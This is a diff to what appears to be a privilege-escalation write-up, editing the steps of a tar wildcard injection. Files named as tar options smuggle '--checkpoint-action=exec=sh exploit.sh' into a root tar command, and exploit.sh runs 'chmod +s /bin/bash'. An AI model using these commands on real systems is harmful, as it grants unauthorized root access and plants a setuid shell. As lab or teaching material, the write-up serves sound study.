@@ -254,7 +254,9 @@ We can exploit that function to execute all the script in the directory (in this
 echo "chmod +s /bin/bash" > exploit.sh
 2. touch /home/user/--checkpoint=1
 3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
-4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privillege
+4. Because of the wild card being used, the --checkpoint=1 and --checkpoint-action=exec=sh\ exploit.sh will actually be included in the tar command, resulting our exploit.sh to be executed
+
+tar --checkpoint=1 --checkpoint-action=exec=sh exploit.sh >> Like this
 
 
 
